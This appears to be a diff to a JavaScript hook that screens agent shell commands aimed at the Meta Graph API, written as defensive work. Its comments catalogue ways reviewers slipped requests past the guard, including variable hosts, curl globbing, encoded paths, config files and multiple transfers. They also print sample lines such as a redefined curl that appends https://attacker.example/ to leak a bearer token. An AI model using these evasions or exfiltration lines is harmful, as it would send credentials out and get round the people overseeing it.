@@ -1,6 +1,30 @@
 /**
  * Meta Graph API request policy — classification, allowlisting and redaction.
  *
+ * WHAT THIS IS, AND WHAT IT IS NOT
+ * --------------------------------
+ * **This hook is a defense-in-depth control for directly visible request
+ * commands. It is NOT the primary Meta egress security boundary.**
+ *
+ * Five rounds of independent review each found another way for a request to
+ * reach Meta without being classified. Each was fixed, and the pattern in the
+ * findings is the point: a shell-command parser is being asked to decide what a
+ * process will do at runtime, which it cannot do in general. It cannot reliably
+ * govern:
+ *
+ *   - executables named by a variable, or resolved through PATH;
+ *   - arbitrary wrappers beyond the small set modelled here;
+ *   - checked-in scripts whose URLs never appear in the command;
+ *   - other interpreters and HTTP libraries with runtime destinations;
+ *   - environment, user or machine-level curl configuration;
+ *   - direct IP access, and every alternate request client.
+ *
+ * Treating a passing guard as proof that Meta cannot be reached is the mistake
+ * this comment exists to prevent. The real boundary is a dedicated Meta gateway
+ * holding the credentials, with direct Graph egress denied to general agent
+ * workloads by network policy — see the Port architecture blocker
+ * `blocker-meta-egress-boundary-required-2026-08-12`.
+ *
  * WHY THIS EXISTS
  * ---------------
  * The previous rule was a single regex pair: match `graph.facebook.com`, then
@@ -53,8 +77,1050 @@ const META_HOST_RE = /graph\.facebook\.com/i;
 /** A parseable Graph URL. Stops at shell metacharacters and quotes. */
 const GRAPH_URL_RE = /(?:https?:\/\/)?graph\.facebook\.com\/[^\s'"`|;&<>()]*/gi;
 
+const URL_TERMINATOR_RE = /[\s"'`|;&<>()]/;
+
+/**
+ * Split every `scheme://…` URL in a command into its AUTHORITY and the rest.
+ *
+ * Structural, not an enumeration. Round 3 found that matching `$HOST` and
+ * `${HOST}` by pattern missed every other valid shell expansion —
+ * `${HOST:?required}`, `${HOST:-fallback}`, `${HOST%/}`, `${HOST##p}` … — each
+ * of which hides the authority while keeping a protected literal path. Listing
+ * expansion syntaxes is the same drift that rounds 1 and 2 already punished, so
+ * this walks the string instead: brace depth is tracked, so a `/` INSIDE an
+ * expansion (as in `${HOST%/}`) does not end the authority, and the authority is
+ * simply "everything before the first unbraced `/` or `?`".
+ *
+ * The authority is then indeterminate if it contains `$` at all — any runtime
+ * expansion, in any form, present or future.
+ */
+function splitUrls(cmd) {
+  const s = String(cmd || '');
+  const out = [];
+  const schemeRe = /https?:\/\//gi;
+  let m;
+  while ((m = schemeRe.exec(s)) !== null) {
+    let i = m.index + m[0].length;
+    let depth = 0;
+    let authority = '';
+    for (; i < s.length; i++) {
+      const ch = s[i];
+      if (ch === '{') depth++;
+      else if (ch === '}') depth = depth > 0 ? depth - 1 : 0;
+      if (depth === 0 && (ch === '/' || ch === '?')) break;
+      if (depth === 0 && URL_TERMINATOR_RE.test(ch)) break;
+      authority += ch;
+    }
+    let rest = '';
+    for (; i < s.length; i++) {
+      const ch = s[i];
+      if (ch === '{') depth++;
+      else if (ch === '}') depth = depth > 0 ? depth - 1 : 0;
+      if (depth === 0 && URL_TERMINATOR_RE.test(ch)) break;
+      rest += ch;
+    }
+    out.push({ authority, rest });
+  }
+  return out;
+}
+
+/** Any runtime expansion in the authority makes the destination unknowable. */
+function authorityIsIndeterminate(authority) {
+  return String(authority || '').includes('$');
+}
+
+// ------------------------------------------------- shared request-target analysis
+//
+// Round 4 found the classifier's ENTRY BOUNDARY was the remaining hole. Scanning
+// raw contiguous `http(s)://…` text only classified an indeterminate authority
+// when a protected LITERAL path or parameter still happened to be visible. So a
+// target that becomes Meta only after expansion — `"https://$HOST/$WABA/$EDGE"`,
+// a bare `"$META_URL"`, `"${SCHEME}://${HOST}/…"`, `https://"$HOST"/…`,
+// `$(get_meta_host)`, backticks, `--url`, `-K file`, curl's own `{{…}}` — never
+// entered evaluateMetaGraph() at all.
+//
+// This is ONE analysis, used by both classification and evaluation, built on the
+// existing quote-aware tokenizer. It deliberately contains no list of variable
+// names: a name carries no provenance, and `$HOST` is not more suspicious than
+// `$X`. What matters is whether a component of the request target is decidable
+// before the command runs.
+
+/** `$VAR`, `${…}`, `$(…)`, backticks, and curl's own `{{…}}` expansion. */
+const EXPANSION_MARKER_RE = /\$\{|\$\(|\$[A-Za-z_{(]|`|\{\{/;
+
+/** Shell separators that start a new command segment. */
+const SEGMENT_SEPARATORS = new Set([';', '&&', '||', '|', '&']);
+
+/** Binaries whose operands are request targets, matched on BASENAME. */
+const CURL_FAMILY_RE = /^(curl|wget|xh|http|https|httpie)$/i;
+
+/**
+ * Wrappers that run another program. Their own options must be parsed, not
+ * skipped by guesswork: `sudo -u root curl …` and `sudo -n docker ps` differ
+ * only in whether the option takes a value, and getting that wrong either
+ * blocks ordinary work or lets a request client through unexamined.
+ *
+ * Anything not listed makes the invocation UNDECIDABLE, which fails closed.
+ */
+const WRAPPERS = new Map([
+  ['env', { bool: new Set(['-i', '-0', '--ignore-environment', '--null']), value: new Set(['-u', '--unset', '-C', '--chdir']), indeterminate: new Set(['-S', '--split-string']), assignments: true }],
+  ['command', { bool: new Set(['-p']), value: new Set() }],
+  ['sudo', { bool: new Set(['-n', '-E', '-H', '-b', '-k', '--non-interactive', '--preserve-env', '--set-home']), value: new Set(['-u', '--user', '-g', '--group', '-p', '--prompt', '-C', '--close-from', '-D', '--chdir', '-R', '--chroot']) }],
+  ['nohup', { bool: new Set(), value: new Set() }],
+  ['nice', { bool: new Set(), value: new Set(['-n', '--adjustment']) }],
+  ['timeout', { bool: new Set(['--preserve-status', '--foreground']), value: new Set(['-s', '--signal', '-k', '--kill-after']), positional: 1 }],
+  ['stdbuf', { bool: new Set(), value: new Set(['-i', '-o', '-e', '--input', '--output', '--error']) }],
+]);
+
+/** `/usr/bin/curl`, `./curl`, `curl.exe` all normalise to `curl`. */
+function basename(tok) {
+  const t = String(tok || '').replace(/\\/g, '/');
+  const last = t.slice(t.lastIndexOf('/') + 1);
+  return last.replace(/\.exe$/i, '');
+}
+
+/**
+ * Resolve the effective request client through any supported wrappers.
+ *
+ * @returns {{client:string|null, start:number, undecidable:boolean}}
+ */
+function resolveInvocation(tokens) {
+  let i = 0;
+  while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i])) i++;
+
+  for (let guard = 0; guard < 8; guard++) {
+    const tok = tokens[i];
+    if (tok == null) return { client: null, start: i, undecidable: false };
+
+    // A binary supplied at runtime cannot be identified before it runs.
+    if (hasExpansion(tok)) return { client: null, start: i, undecidable: true };
+
+    const base = basename(tok);
+    if (CURL_FAMILY_RE.test(base)) return { client: base.toLowerCase(), start: i + 1, undecidable: false };
+
+    const w = WRAPPERS.get(base.toLowerCase());
+    if (!w) return { client: null, start: i, undecidable: false };
+
+    i++;
+    if (w.assignments) while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i])) i++;
+    let positionalsLeft = w.positional || 0;
+    while (i < tokens.length) {
+      const t = tokens[i];
+      if (t === '--') { i++; break; }
+      if (!t.startsWith('-')) {
+        if (positionalsLeft > 0) { positionalsLeft--; i++; continue; }
+        break; // the wrapped program
+      }
+      const eq = t.indexOf('=');
+      const name = eq === -1 ? t : t.slice(0, eq);
+      // An option that re-parses its argument into a command hides the client.
+      if (w.indeterminate && w.indeterminate.has(name)) return { client: null, start: i, undecidable: true };
+      if (w.bool.has(name)) { i++; continue; }
+      if (w.value.has(name)) { i += eq === -1 ? 2 : 1; continue; }
+      // An option we cannot classify may or may not consume the next token, so
+      // the effective client is no longer determinable.
+      return { client: null, start: i, undecidable: true };
+    }
+  }
+  return { client: null, start: 0, undecidable: true };
+}
+
+/** Every curl config form. A config source can set URL, method, headers and data. */
+function hasOpaqueConfig(tokens, start) {
+  for (let i = start; i < tokens.length; i++) {
+    const t = tokens[i];
+    if (t === '-K' || t === '--config') return true;
+    if (/^--config=/.test(t)) return true;
+    if (/^-K./.test(t)) return true; // -Kfile, -K-
+    if (/^-[A-Za-z]*K/.test(t)) return true; // clustered, attached or not
+  }
+  return false;
+}
+
+/** curl expands {a,b} and [1-9] in URLs unless -g/--globoff is given. */
+// A brace preceded by a dollar sign is shell expansion, not curl's {a,b}
+// sequence; that is classified elsewhere and must not be double-counted here.
+const CURL_GLOB_RE = /(^|[^$])[{[]/;
+function globbingDisabled(tokens, start) {
+  for (let i = start; i < tokens.length; i++) {
+    const t = tokens[i];
+    if (t === '--globoff') return true;
+    if (/^-[A-Za-z]*g/.test(t) && !t.startsWith('--')) return true;
+  }
+  return false;
+}
+
+/**
+ * `-q` / `--disable` must be the FIRST curl PARAMETER, not merely the first
+ * option, or curl reads `.curlrc` before it gets there.
+ *
+ * The previous version skipped operands looking for the first flag, so
+ * `curl <url> -q` counted — but curl parses left to right and has already read
+ * its config file by the time it reaches `-q`. Position is the whole control
+ * here, so it is checked exactly: token[start] and nothing else.
+ *
+ * A short cluster whose FIRST letter is `q` (`-qsG`) is accepted: `q` is still
+ * the first parameter curl sees. `-sq` is not.
+ */
+function disablesCurlrc(tokens, start) {
+  const first = tokens[start];
+  if (first == null) return false;
+  if (first === '-q' || first === '--disable') return true;
+  return /^-q[A-Za-z0-9]*$/.test(first);
+}
+
+function hasExpansion(s) {
+  return EXPANSION_MARKER_RE.test(String(s || ''));
+}
+
+/**
+ * Is this operand plausibly a request TARGET rather than a data pair?
+ *
+ * Not every non-flag token is a URL. `-d "access_token=$APP"` puts a data pair
+ * in operand position whenever the short flag is not in VALUE_TAKING, and
+ * treating that as a fully-variable target denied the sanctioned debug_token
+ * read — caught by the existing 95-assertion suite before this shipped.
+ *
+ * A target either carries a scheme, IS an expansion, or has a path whose first
+ * separator is not preceded by a `=` or `@` (which would make it a data pair or
+ * a file-sourced parameter).
+ */
+function looksLikeTarget(tok) {
+  const t = String(tok || '');
+  if (t === '') return false;
+  if (t.includes('://')) return true;
+  if (/^(\$|`|\{\{)/.test(t)) return true;
+  const slash = t.indexOf('/');
+  if (slash === -1) return false;
+  const head = t.slice(0, slash);
+  return !head.includes('=') && !head.includes('@');
+}
+
+/**
+ * Split a request target into scheme / authority / path / query, treating
+ * `${…}`, `$(…)` and `{{…}}` as atomic so a separator inside an expansion does
+ * not end a component early.
+ */
+function splitTarget(raw) {
+  const s = String(raw || '');
+  let scheme = '';
+  let rest = s;
+  const sep = s.indexOf('://');
+  if (sep !== -1) {
+    scheme = s.slice(0, sep);
+    rest = s.slice(sep + 3);
+  }
+
+  let depth = 0;
+  let i = 0;
+  let authority = '';
+  for (; i < rest.length; i++) {
+    const two = rest.slice(i, i + 2);
+    if (two === '${' || two === '$(' || two === '{{') {
+      depth++;
+      authority += two;
+      i++;
+      continue;
+    }
+    const ch = rest[i];
+    if (ch === '}' || ch === ')') {
+      if (depth > 0) depth--;
+      authority += ch;
+      continue;
+    }
+    if (depth === 0 && (ch === '/' || ch === '?')) break;
+    authority += ch;
+  }
+
+  const tail = rest.slice(i);
+  const q = tail.indexOf('?');
+  return {
+    scheme,
+    authority,
+    path: q === -1 ? tail : tail.slice(0, q),
+    query: q === -1 ? '' : tail.slice(q + 1),
+  };
+}
+
+/**
+ * Collect request targets and opaque sources from the curl-family segments of a
+ * command. Only those segments are analysed, so an ordinary `cd $DIR && …` is
+ * untouched — its operands are not request targets.
+ */
+function analyzeRequestTargets(cmd) {
+  // `invocations` groups targets by curl invocation. The flat `targets` list is
+  // kept for callers that only ask "is any target undecidable"; anything that
+  // reasons about how many destinations ONE curl has must use `invocations`,
+  // because `a && b` is two invocations and must not be conflated.
+  const result = { targets: [], invocations: [], opaqueConfig: false, sawRequestClient: false };
+  const toks = tokenize(cmd);
+
+  let seg = [];
+  const segments = [];
+  for (const t of toks) {
+    if (SEGMENT_SEPARATORS.has(t)) {
+      segments.push(seg);
+      seg = [];
+      continue;
+    }
+    seg.push(t);
+  }
+  segments.push(seg);
+
+  for (const segment of segments) {
+    const inv = resolveInvocation(segment);
+    if (inv.undecidable) {
+      result.undecidableInvocation = true;
+      continue;
+    }
+    if (!inv.client) continue;
+    const k = inv.start - 1;
+    result.sawRequestClient = true;
+    if (hasOpaqueConfig(segment, inv.start)) result.opaqueConfig = true;
+    if (!disablesCurlrc(segment, inv.start)) result.curlrcReachable = true;
+    const globOff = globbingDisabled(segment, inv.start);
+
+    const invocation = { client: inv.client, tokens: segment.slice(k), targets: [], multiTransfer: false, ambiguous: false };
+    result.invocations.push(invocation);
+    const push = (entry) => {
+      invocation.targets.push(entry);
+      result.targets.push(entry);
+    };
+
+    // AUTHORITATIVE PARSE, from the resolved executable. argv[0] is the curl
+    // binary itself so the shared parser sees the shape it expects.
+    const argv = segment.slice(k);
+    const parsed = parseCurlTokens(argv);
+
+    // curl's transfer separator, long and short form. A second transfer is a
+    // second destination, carrying the options that follow it.
+    if (argv.some((t) => t === '--next' || t === '-:')) invocation.multiTransfer = true;
+
+    // An option we cannot classify may or may not consume the next token, so
+    // which tokens are operands is no longer decidable.
+    if (parsed.unknown.length > 0) invocation.ambiguous = true;
+
+    for (const o of parsed.opts) {
+      if (o.flag === '--url' && o.value != null) push({ raw: o.value, globOff, fromUrlFlag: true });
+    }
+    // Everything curl did not consume as an option or an option value is a URL.
+    // Scheme-less hosts, host:port, bare IPv4/IPv6 and localhost all land here
+    // without any syntax being enumerated.
+    //
+    // Only for curl, though. The other clients in CURL_FAMILY_RE do not share
+    // curl's grammar — httpie's `key==value` is a query parameter, not a
+    // destination — so applying curl's operand rule to them would invent
+    // targets. They keep the older shape-based filter, and their own policy
+    // rules refuse them with more precise messages.
+    const isCurl = inv.client === 'curl';
+    for (const op of parsed.operands) {
+      if (isCurl || looksLikeTarget(op)) push({ raw: op, globOff });
+    }
+  }
+  return result;
+}
+
+/**
+ * Anchored scheme. `indexOf('://')` is not good enough: in
+ * `attacker.example/#https://graph.facebook.com/...` the first `://` sits in the
+ * FRAGMENT, and reading a scheme from there is how an attacker target came to be
+ * described as a Graph target.
+ */
+const ANCHORED_SCHEME_RE = /^([A-Za-z][A-Za-z0-9+.\-]*):\/\//;
+
+/**
+ * Parse a request target's identity FROM ITS BEGINNING.
+ *
+ * Round 9: target identity was previously decided by scanning the whole command
+ * for a `graph.facebook.com` substring. That validated a Graph-looking string
+ * sitting in another target's path, query or fragment, or in a header, referer
+ * or user-agent value — while curl's actual destination was elsewhere and the
+ * bearer credential went with it.
+ *
+ * Identity now comes only from the operand curl will actually contact.
+ */
+function parseTargetIdentity(raw) {
+  const s = String(raw == null ? '' : raw).trim();
+  const m = ANCHORED_SCHEME_RE.exec(s);
+  const scheme = m ? m[1].toLowerCase() : null;
+  const rest = m ? s.slice(m[0].length) : s;
+
+  let end = rest.length;
+  for (let i = 0; i < rest.length; i++) {
+    const c = rest[i];
+    if (c === '/' || c === '?' || c === '#') {
+      end = i;
+      break;
+    }
+  }
+  let authority = rest.slice(0, end);
+
+  const at = authority.lastIndexOf('@');
+  const hadUserinfo = at !== -1;
+  if (hadUserinfo) authority = authority.slice(at + 1);
+
+  let port = '';
+  if (authority.startsWith('[')) {
+    const close = authority.indexOf(']');
+    if (close !== -1) {
+      if (authority[close + 1] === ':') port = authority.slice(close + 2);
+      authority = authority.slice(0, close + 1);
+    }
+  } else {
+    const colon = authority.lastIndexOf(':');
+    if (colon !== -1) {
+      port = authority.slice(colon + 1);
+      authority = authority.slice(0, colon);
+    }
+  }
+
+  return { scheme, host: authority.toLowerCase(), port, hadUserinfo, hadScheme: m !== null };
+}
+
+/** Exactly the Graph authority, over HTTPS, with nothing else in the authority. */
+function isExactGraphHttpsTarget(id) {
+  return id.scheme === 'https' && id.host === 'graph.facebook.com' && id.port === '' && !id.hadUserinfo;
+}
+
+/**
+ * The command mentions the Graph host, but is that where curl is actually going?
+ *
+ * Answered per curl invocation, from its own tokens — never from the whole
+ * command, so a Graph read chained after an ordinary request is not accused of
+ * something the other invocation did.
+ *
+ * @returns {{reason:string, remedy:string}|null}
+ */
+function metaTargetIdentityViolation(cmd) {
+  const { invocations } = analyzeRequestTargets(cmd);
+  for (const inv of invocations) {
+    if (inv.client !== 'curl') continue; // other clients have their own rules
+
+    let exact = 0;
+    for (const e of inv.targets) {
+      const id = parseTargetIdentity(e.raw);
+      if (id.host !== 'graph.facebook.com') continue;
+
+      if (isExactGraphHttpsTarget(id)) {
+        exact++;
+        continue;
+      }
+      if (id.scheme !== 'https') {
+        return {
+          reason:
+            'This Meta request is not HTTPS. curl defaults a scheme-less target to plaintext HTTP, so a missing scheme is ' +
+            'not a neutral omission — it sends the bearer credential in the clear. A sanctioned Meta request must name ' +
+            '`https` literally.',
+          remedy: 'write the target as `https://graph.facebook.com/...`.',
+        };
+      }
+      return {
+        reason:
+          'The target’s authority is not exactly `graph.facebook.com`. Userinfo, an explicit port, a hostname prefix or ' +
+          'suffix, or a trailing dot all make the host that will actually be contacted something other than Graph, while the ' +
+          'command still reads as a Graph request.',
+        remedy: 'use the bare authority `graph.facebook.com` with no userinfo and no port.',
+      };
+    }
+
+    if (exact > 0) continue;
+
+    // No authoritative Graph destination in this invocation — yet the Graph host
+    // appears in its text. It is in a path, query, fragment, header, referer,
+    // user-agent or some other option value, and the request is going somewhere
+    // else entirely.
+    if (inv.tokens.some((t) => META_HOST_RE.test(String(t || '')))) {
+      return {
+        reason:
+          'The Graph host appears in this command, but it is not the destination. curl will contact a different authority, ' +
+          'and every credential-bearing option applies to THAT request. A Graph URL embedded in a path, query, fragment, ' +
+          'header, referer or user-agent proves nothing about where the request goes.',
+        remedy: 'make the Graph URL the request target itself, as the single operand or a single `--url`.',
+      };
+    }
+  }
+  return null;
+}
+
+/**
+ * Same-command shadowing of a request client.
+ *
+ * Round 10, F2/F3. The guard identifies the client by reading the token `curl`.
+ * The shell can change what that token MEANS before it runs:
+ *
+ *   curl() { command curl "$@" https://attacker.example/; }; curl <sanctioned read>
+ *   curl() { command curl -X POST "$@"; };                   curl <sanctioned read>
+ *
+ * The first appends a second destination and the credential goes to both. The
+ * second turns an allowlisted READ of a protected edge into a POST against it —
+ * a live subscription mutation, while method classification reports GET.
+ *
+ * BOUNDED BY CONSTRUCTION, and the bound is the point. This detects a binding
+ * established INSIDE the command being inspected. It cannot detect — and must
+ * never be described as detecting — a function or alias defined in an earlier
+ * shell turn, a sourced file, a shell startup file, a shim earlier on `PATH`, or
+ * a replaced client binary. None of those leave a marker in this command. That
+ * residue belongs to blocker-meta-egress-boundary-required-2026-08-12 and is not
+ * closable by reading command text.
+ */
+const SHADOWABLE_CLIENT = '(?:curl|wget|xh|httpie|http)';
+const SHADOW_PATTERNS = [
+  // function curl { … }   /   function curl() { … }
+  new RegExp('(^|[;&|(\\s])function\\s+' + SHADOWABLE_CLIENT + '\\b', 'i'),
+  // curl() { … }
+  new RegExp('(^|[;&|(\\s])' + SHADOWABLE_CLIENT + '\\s*\\(\\s*\\)\\s*\\{', 'i'),
+  // alias curl=…
+  new RegExp('(^|[;&|(\\s])alias\\s+' + SHADOWABLE_CLIENT + '\\s*=', 'i'),
+  // curl=… — a binding that changes how the apparent client is invoked
+  new RegExp('(^|[;&|(\\s])' + SHADOWABLE_CLIENT + '\\s*=', 'i'),
+  // eval / source of visible text that establishes such a binding
+  new RegExp('(^|[;&|(\\s])(eval|source|\\.)\\s+[^;&|]*\\b' + SHADOWABLE_CLIENT + '\\s*(\\(\\s*\\)|=)', 'i'),
+];
+
+/** @returns {{reason:string, remedy:string}|null} */
+function shellShadowViolation(cmd) {
+  const s = String(cmd || '');
+  for (const re of SHADOW_PATTERNS) {
+    if (!re.test(s)) continue;
+    return {
+      reason:
+        'This command redefines a request client before using it — as a function, an alias, or a binding. Whatever the ' +
+        'command then appears to request, the shell decides what actually runs: a redefinition can append a second ' +
+        'destination, or force a write method against an endpoint the policy cleared as a read. Nothing later in this ' +
+        'command can be trusted to describe the request that leaves the machine.',
+      remedy:
+        'invoke the request client directly, without defining or rebinding its name in the same command.',
+    };
+  }
+  return null;
+}
+
+/**
+ * A Meta curl must have exactly ONE destination.
+ *
+ * curl applies shared options — `-H`, and `-G` data parameters — to EVERY URL in
+ * a transfer, and `--next` starts another transfer with the options that follow.
+ * So a command could pass every rule this policy checks against its Graph URL
+ * and, in the same breath, send the same `Authorization: Bearer` header to a
+ * second, entirely literal, attacker-controlled destination. The Graph target
+ * was valid; the credential still left for somewhere else.
+ *
+ * Counted per INVOCATION, not per command: `curl A && curl B` is two separate
+ * single-destination requests and stays allowed.
+ *
+ * Checked before splitTransfers(), which discards non-Graph transfers and would
+ * therefore throw away the very evidence this rule needs.
+ *
+ * @returns {{reason:string, remedy:string}|null}
+ */
+function singleDestinationViolation(cmd) {
+  const { invocations } = analyzeRequestTargets(cmd);
+  for (const inv of invocations) {
+    // Scoped to curl: this rule exists because curl applies shared options to
+    // every URL in a transfer. Other clients are refused by their own rules,
+    // which name the offending construct more precisely than this one could.
+    if (inv.client !== 'curl') continue;
+
+    const touchesGraph = inv.targets.some((e) => META_HOST_RE.test(String(e.raw || '')));
+    if (!touchesGraph) continue; // an ordinary multi-URL curl elsewhere is not ours to police
+
+    if (inv.multiTransfer) {
+      // Accuracy note, verified against curl's own docs for --next: LOCAL
+      // options (-H, -d, …) are RESET for the subsequent URL; only global
+      // options persist. So the risk is not that the credential leaks forward
+      // automatically — it is that a second transfer in the same command can
+      // supply its own credential to a different destination, and that only the
+      // Graph transfer is examined by the rules below. One command, two
+      // requests, one of them unreviewed.
+      return {
+        reason:
+          'This curl performs more than one transfer (`--next` / `-:`) and one of them is a Graph request. Each transfer ' +
+          'can carry its own credential to its own destination, and only the Graph transfer is validated here. ' +
+          'Multi-transfer Meta curl has no legitimate use.',
+        remedy: 'issue one curl per request, each with a single Graph URL.',
+      };
+    }
+
+    // An unmodelled option is already refused downstream by a rule that NAMES
+    // it, so it can be added deliberately. Pre-empting that with a vaguer
+    // message would be a regression in the refusal, not an improvement in
+    // safety — the command is refused either way. Transfer separators are
+    // checked ABOVE this, because `--next` is itself unmodelled by the option
+    // tables and would otherwise be skipped here.
+    if (inv.ambiguous) continue;
+
+    if (inv.targets.length > 1) {
+      return {
+        reason:
+          'This curl has more than one request target and one of them is a Graph request. curl applies a shared ' +
+          '`-H` header and `-G` data parameters to EVERY URL in the transfer, so the Meta credential would be sent to each ' +
+          'destination in turn — including any that is not Meta. Only the Graph URL is validated by this policy; the others ' +
+          'are not, and need not be for the credential to leave.',
+        remedy: 'give this curl exactly one URL. Multiple Graph reads are separate curl commands.',
+      };
+    }
+  }
+  return null;
+}
+
+/**
+ * Hygiene a Meta request must satisfy, beyond having a decidable target.
+ *
+ * Scoped to Meta-classified commands so ordinary non-Meta curl usage is not
+ * forced to adopt it.
+ *
+ * @returns {{reason:string, remedy:string}|null}
+ */
+function metaCurlHygieneViolation(cmd) {
+  const toks = tokenize(cmd);
+  const segments = [];
+  let seg = [];
+  for (const t of toks) {
+    if (SEGMENT_SEPARATORS.has(t)) { segments.push(seg); seg = []; continue; }
+    seg.push(t);
+  }
+  segments.push(seg);
+
+  for (const segment of segments) {
+    const inv = resolveInvocation(segment);
+    if (!inv.client || inv.client !== 'curl') continue;
+
+    // curl reads ~/.curlrc unless disabled FIRST. That file can add headers,
+    // a proxy, --resolve, --insecure — none of it visible in this command.
+    if (!disablesCurlrc(segment, inv.start)) {
+      return {
+        reason:
+          'curl reads its default configuration file unless `-q` (or `--disable`) is the FIRST option. That file can add ' +
+          'headers, a proxy, an address override or disable certificate verification, none of which appear in this command — ' +
+          'so the request that actually leaves the machine cannot be read from what is written here.',
+        remedy: 'put `-q` immediately after `curl`, before every other option.',
+      };
+    }
+
+    // A header value read from a file hides the credential and its destination.
+    for (let i = inv.start; i < segment.length; i++) {
+      const t = segment[i];
+      let value = null;
+      if (t === '-H' || t === '--header') value = segment[i + 1];
+      else if (/^--header=/.test(t)) value = t.slice('--header='.length);
+      else if (/^-H./.test(t)) value = t.slice(2);
+      if (value != null && /^@/.test(String(value).trim())) {
+        return {
+          reason:
+            'A request header is being read from a file. The header contents are not visible in the command, so neither the ' +
+            'credential being sent nor its destination can be verified before the request runs.',
+          remedy: 'write the header literally, keeping only the token as an environment reference.',
+        };
+      }
+    }
+  }
+  return null;
+}
+
+/**
+ * Does anything about this command's request target resist decision before it
+ * runs? Fail-closed by construction: an undecidable target is classified so
+ * evaluateMetaGraph() can deny it, rather than skipped because no protected
+ * literal happened to survive.
+ */
+function targetsResistDecision(cmd) {
+  const { targets, opaqueConfig, undecidableInvocation } = analyzeRequestTargets(cmd);
+
+  // A wrapper option we cannot classify may or may not consume the next token,
+  // so the effective request client is no longer determinable.
+  if (undecidableInvocation) return true;
+
+  // A config source can set the URL, method, headers and data. Whatever it
+  // contains is unknown here, and reading it is not this guard's job.
+  if (opaqueConfig) return true;
+
+  for (const entry of targets) {
+    const raw = entry.raw;
+
+    // `--url @file` / `--url=@file` / `--url @-` read the target from a file or
+    // from stdin. The destination is therefore not in the command at all, and
+    // reading the source to find out is not this guard's job — nor would it be
+    // sound, since the file can change between inspection and execution.
+    if (entry.fromUrlFlag && /^@/.test(String(raw || '').trim())) return true;
+
+    const t = splitTarget(raw);
+
+    // curl expands {a,b} and [1-9] in URLs by default. `graph.face{book,x}.com`
+    // constructs the Meta hostname from a literal that never contains it.
+    //
+    // Scoped to the components that decide WHERE the request goes: scheme,
+    // authority, path and query-KEY identity. A glob inside a query VALUE
+    // cannot change the destination, and Graph's own field-expansion syntax
+    // uses braces there — treating that as indeterminate would deny the
+    // credential-field assertions this policy exists to make.
+    if (!entry.globOff) {
+      const routing = [t.scheme, t.authority, t.path];
+      if (routing.some((c) => CURL_GLOB_RE.test(String(c || '')))) return true;
+      if (splitQuery(t.query).some((p) => CURL_GLOB_RE.test(String(p.key || '')))) return true;
+    }
+    const authorityUnknown = hasExpansion(t.authority) || hasExpansion(t.scheme);
+    if (!authorityUnknown) continue; // a literal non-Meta authority is provably not Meta
+
+    // Nothing literal follows the authority: the whole destination is a variable.
+    if (t.path === '' && t.query === '') return true;
+
+    if (hasExpansion(t.path)) return true;
+    if (splitQuery(t.query).some((p) => hasExpansion(p.key))) return true;
+
+    if (isGraphShapedPath(t.path + (t.query ? '?' + t.query : ''))) return true;
+  }
+  return false;
+}
+
+/**
+ * `/v21.0/...` — a Graph version segment. The decimal is REQUIRED: Graph
+ * versions are always `v<major>.<minor>`, whereas plain `/v1/`, `/v2/` are the
+ * commonest internal-API convention there is. Matching those would fail-closed
+ * every versioned internal request on a variable host.
+ */
+const VERSION_SEGMENT_RE = /^\/v\d+\.\d+(?:\/|$)/i;
+
+/**
+ * Every edge the policy models, in one derived set.
+ *
+ * Round-2 review found the previous version derived from the token-minting sets
+ * ONLY, which left the mutation edges outside classification: with
+ * HOST=graph.facebook.com exported earlier, `POST https://$HOST/{id}/messages`
+ * and `POST|DELETE https://$HOST/{id}/subscribed_apps` are real Meta mutations,
+ * and the guard treated them as ordinary Bash. ALLOWED_EDGES and
+ * SIDE_EFFECTING_EDGES are just as protected as the minting ones — an edge the
+ * policy bothers to name is an edge that must be classified.
+ *
+ * Built lazily so it always reflects the sets as declared, and can never be a
+ * stale copy of them.
+ */
+let _protectedEdges = null;
+function protectedEdges() {
+  if (!_protectedEdges) {
+    _protectedEdges = new Set([...TOKEN_MINTING_EDGES, ...ALLOWED_EDGES, ...SIDE_EFFECTING_EDGES]);
+  }
+  return _protectedEdges;
+}
+
+let _protectedRootPaths = null;
+function protectedRootPaths() {
+  if (!_protectedRootPaths) {
+    _protectedRootPaths = new Set([...TOKEN_MINTING_PATHS, ...ALLOWED_ROOT_PATHS]);
+  }
+  return _protectedRootPaths;
+}
+
+/** `https://$HOST:443/...` — strip an explicit port before the path is read. */
+const LEADING_PORT_RE = /^:\d{1,5}/;
+
+/**
+ * Is this URL path Graph-shaped enough to classify, when the host is hidden
+ * behind a shell variable?
+ *
+ * DERIVED from the authoritative sets — never a second hand-kept list. Two
+ * successive reviews caught drift in exactly that pattern, so the lists are
+ * gone: widening any protected set now widens classification automatically.
+ *
+ * Deliberately NOT matched: a single-segment `/accounts`. The Meta shapes are
+ * `/{id}/accounts` and `/me/accounts`; requiring two segments keeps an ordinary
+ * internal `https://$SVC/accounts` working.
+ */
+/**
+ * Percent-decode ONCE for comparison purposes.
+ *
+ * Round 3: the classifier lowercased raw segments but never decoded them, so
+ * `/123/%73ubscribed_apps` and `/123/m%65ssages` compared unequal to the
+ * protected edges while curl sent the decoded path — the same live mutation.
+ *
+ * Exactly one pass, never a loop: repeated decoding invents attacks that curl
+ * would not perform and has no natural stopping point. A malformed escape
+ * returns `null`, which callers treat as fail-closed — decoding is a
+ * comparison aid, and input that cannot be normalised cannot be cleared.
+ */
+function decodeOnceForCompare(s) {
+  const raw = String(s || '');
+  if (!raw.includes('%')) return raw;
+  if (/%(?![0-9a-fA-F]{2})/.test(raw)) return null; // malformed escape
+  try {
+    return decodeURIComponent(raw);
+  } catch (_) {
+    return null; // e.g. a lone surrogate escape
+  }
+}
+
+function isGraphShapedPath(rawPath) {
+  let raw = String(rawPath || '');
+  raw = raw.replace(LEADING_PORT_RE, '');
+  if (!raw.startsWith('/')) return false;
+
+  const qIndex = raw.indexOf('?');
+  const pathPartRaw = qIndex === -1 ? raw : raw.slice(0, qIndex);
+  const queryPart = qIndex === -1 ? '' : raw.slice(qIndex + 1);
+
+  // A credential exchange is identifiable from its query alone — checked
+  // against the authoritative parameter set, with keys percent-decoded by
+  // splitQuery(), so `client%5Fsecret` cannot slip past a literal match.
+  const inlineParams = splitQuery(queryPart);
+  if (hasTokenExchangeParam(inlineParams)) return true;
+
+  // Round 10, F4: a `fields` value asking for credential material or a
+  // token-minting edge identifies a Graph request on its own, even when the
+  // path is `/me` or otherwise unremarkable.
+  if (fieldsRequestCredential(inlineParams)) return true;
+
+  // Versioned Graph URL — nothing else uses this shape.
